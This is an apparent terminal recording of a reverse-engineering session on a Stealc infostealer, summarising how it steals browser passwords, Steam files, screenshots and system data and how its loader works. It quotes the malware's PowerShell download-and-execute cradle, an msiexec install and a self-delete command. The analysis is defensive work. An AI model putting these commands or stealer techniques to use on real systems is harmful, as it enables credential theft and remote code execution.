[0.058, "o", "\u001b[4;1H\u001b[97mData/History\u001b[Cslots xref-pinned to FUN_14001b6ac) are stolen\u001b[1m wholesale — no SQL SELECTs exist in the binary\u001b(B\u001b[m\u001b[97m. Output\u001b[93m passwords.txt\u001b[97m with\u001b[39m         \r\n\u001b[93murl:/login:/password:\u001b[97m labels.\u001b[39m                                                                                                        \r\n                             \r\n\u001b[97m\u001b[1mTask 14 — Wallets/apps (!130):\u001b(B\u001b[m\u001b[97m zero hardcoded wallet/extension/app names — targeting is server-side (\u001b[93mwallets\u001b[97m/\u001b[93mbrowsers\u001b[97m/\u001b[93mplugins\u001b[97m/\u001b[93mfiles\u001b[97m config keys);\r\nhardcoded plumbing:\u001b[93m chrome_extension_\u001b[97m + In\u001b[2CxedDB collection (FUN_14001d7a0).\u001b[1m Steam is the one built-in module\u001b(B\u001b[m\u001b[97m (\u001b[93mst\u001b[Cam_steal_\u001b[Cs\u001b[Cn_vdf_module\u001b[97m @\u001b[39m    \r\n\u001b[97m0x140037704: HKCU\u001b[93m Softwar\u001b[C\\Valve\\Steam\u001b(B\u001b[m\u001b[97m →\u001b[93m SteamPath\u001b[97m →\u001b[93m \\config\\\u001b[97m +\u001b[93m ssfn*,*.vdf\u001b[97m mask list).\u001b[93m steal_outlook\u001b[97m flag exists but its consumer wasn't pinpointed\r\n(flagged for\u001b[Creview). Telegram/Discord/FTP/VPN: no\u001b[Chardcoded targeting demonstrated (reachable only via server gra\u001b[Cber rules).\u001b[39m                      \r\n                                                                                                                              \r\n\u001b[97m\u001b[1mTask 15 — Grabber/profiling (!131):\u001b(B\u001b[m\u001b[97m server-configured grabber (parser FUN_140025910: masks/start_path/recursive/max_size/csidl; executor\r\n\u001b[93mgrabber_enum_match_collect_files\u001b[97m @ 0x1400082d8, copy-stage-read-del\u001b[Cte pattern). Screen\u001b[Chot @ 0x14003a430: GDI+\u001b[1m virtual-screen (multi-monitor)\u001b(B\u001b[m\u001b[97m BitBlt\r\nSRCCOPY|CAPTUREBLT → JPEG (\u001b[93mscr\u001b[Censhot.jpg\u001b[97m). System profiling @ 0x140026dc4: process list, installed apps via Uninstall key ×2 (@ 0x1400385c0),\u001b[39m       \r\n\u001b[97mHWID-from-volume-serial beacon (FUN_140026214).\u001b[39m                                                                                               \r\n                                               \r\n\u001b[97m\u001b[1mTask 16 — Loader + self-delete (!132):\u001b(B\u001b[m\u001b[97m C2\u001b[93m loader\u001b[97m tasking @ 0x140029900 dispatches\u001b[1m EXE\u001b(B\u001b[m\u001b[97m (0x140028978),\u001b[1m PowerShell IEX cradle\u001b(B\u001b[m\u001b[97m (0x140028e58,\u001b[93m -nop -c\r\niex(New-Object Net.WebClient).DownloadString('…')\"\u001b[97m via SysWOW6\u001b[C powershell.exe), and\u001b[1m MSI\u001b(B\u001b[m\u001b[97m (0x140029224,\u001b[93m msiexec /i … /passive\u001b[97m), each with optional\r\n\u001b[93mrunas\u001b[97m elevation via ShellExecuteExA (identity byte-proven, slot\u001b[C0x1400b08d0).\u001b[1m Self-delete @ 0x14003b870 confirmed\u001b(B\u001b[m\u001b[97m:\u001b[93m GetModul\u001b[CFileNameA\u001b[97m →\u001b[93m cmd.exe /c\r\ntimeout /t 5 & del /f /q \"<own path>\"\u001b[97m via ShellEx\u001b[CcuteExA (verb\u001b[C\"open\" byte-verified) → ExitProcess(0) (name byte-proven twice: blob 0x14007d770 →\r\nslot 0x1400b1d90 → ptr 0x1400b4e08) —\u001b[Cgated on th\u001b[C server\u001b[Cconfig flag\u001b[93m self_delete\u001b[97m. Bonus ar\u001b[Cifa\u001b[Ct: builder sourc\u001b[C \u001b[Cath\u001b[93m C:\\builder_v2\\stealc\\json.h\u001b[97m in\r\nthe loader-tasking\u001b[Casserts.\u001b[39m                                                                                                                          \r\n                           \r\n\u001b[97mEleven key functions were renamed in the Ghidra project for persistence.\r\n\u001b[39m                                                                        \r\n\u001b[90m○\u001b[CDeveloper(Themis